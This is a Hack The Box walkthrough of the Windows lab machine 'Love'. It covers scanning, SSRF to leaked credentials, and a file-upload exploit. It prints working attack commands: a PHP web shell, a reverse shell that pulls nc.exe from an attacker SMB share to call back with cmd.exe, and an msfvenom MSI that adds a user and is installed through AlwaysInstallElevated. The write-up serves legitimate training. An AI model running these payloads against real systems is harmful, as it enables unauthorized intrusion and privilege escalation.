---
layout: single
title: Love - Hack The Box
excerpt: "Love is an easy windows machine where it features a voting system application that suffers from an authenticated remote code execution vulnerability. Our port scan reveals a service running on port 5000 where browsing the page we discover that we are not allowed to access the resource. Furthermore a file scanner application is running on the same server which is though effected by a SSRF vulnerability where it&amp;amp;#039;s exploitation gives access to an internal password manager. We can then gather credentials for the voting system and by executing the remote code execution attack as phoebe user we get the initial foothold on system. Basic windows enumeration reveals that the machine suffers from an elevated misconfiguration. Bypassing the applocker restriction we manage to install a malicious msi file that finally results in a reverse shell as the system account."
date: 2025-05-27
classes: wide
header:
  teaser: /img2/love.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Windows
  - Easy
tags:
  - Server Side Request Forgery (SSRF)
  - Exploiting Voting System
  - Abusing AlwaysInstallElevated (msiexec/msi file)
---


## Reconnaissance

- Nmap

```bash
nmap --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.239
```

![](/img2/Pasted%20image%2020250527104640.png)

- Vulnerability and version scan

```bash
nmap -sCV -p80,135,139,443,445,3306,5040,7680 10.10.10.239
```

![](/img2/Pasted%20image%2020250527111101.png)

- Add domain to local DNS

```bash
echo "10.10.10.239 staging.love.htb" >> /etc/hosts
```

## Exploitation

- Server-Side Request Forgery (SSRF)

![](/img2/Pasted%20image%2020250527120847.png)

![](/img2/Pasted%20image%2020250527120931.png)

- Leaked credentials

![](/img2/Pasted%20image%2020250527121034.png)

![](/img2/Pasted%20image%2020250527121306.png)

- Abuse File Upload

![](/img2/Pasted%20image%2020250527121944.png)

```php
<?php
	system("whoami");
?>
```

![](/img2/Pasted%20image%2020250527122019.png)

- Reverse shell

```php
<?php
  system('cmd /c \\\\10.10.16.7\\smbFolder\\nc.exe 10.10.16.7 9000 -e cmd.exe');
?>
```

```bash
impacket-smbserver smbFolder -smb $(pwd) -smb2support
```

![](/img2/Pasted%20image%2020250527121944.png)

```bash
rlwrap nc -nvlp 9000
```

## Post-exploitation

- WinPEAS enumeration

![](/img2/Pasted%20image%2020250527131427.png)

- AlwaysInstallElevated exploitation

```bash
msfvenom -p windows/adduser USER=pyuser PASS=P@ssword123! -f msi -o alwe.msi
```

```bash
impacket-smbserver smbFolder -smb $(pwd) -smb2support
```

```
copy \\10.10.16.7\smbFolder\alwe.msi
```

```
msiexec /i "C:\Users\Phoebe\AppData\Local\Temp\alwe.msi" /quiet /norestart
```

- Connect with new user

```bash
evil-winrm -i 10.10.10.239 -u pyuser -p P@ssword123!
```

![](/img2/Pasted%20image%2020250527131858.png)